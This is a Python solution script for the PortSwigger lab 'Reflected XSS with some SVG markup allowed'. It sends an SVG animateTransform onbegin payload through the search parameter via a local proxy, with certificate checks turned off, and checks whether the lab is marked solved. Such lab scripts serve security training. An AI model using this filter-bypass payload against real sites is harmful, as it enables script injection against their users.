# PortSwigger Lab: Reflected XSS with some SVG markup allowed  
import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def main():
    print("Starting the Exploit...")

    try:
        host = sys.argv[1].strip().rstrip('/')
    except:
        print(f'[-]Usage : {sys.argv[0]} <HOST>')
        print(f'[-]Example : {sys.argv[0]} http://example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    payload = f'{host}/?search=<svg><animateTransform onbegin="alert(1)"/></svg>'
    client.get(payload)

    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to Exploit')
        sys.exit(-1)
    
    print('[+] Exploited Successfully')

if __name__ == "__main__":
    main()
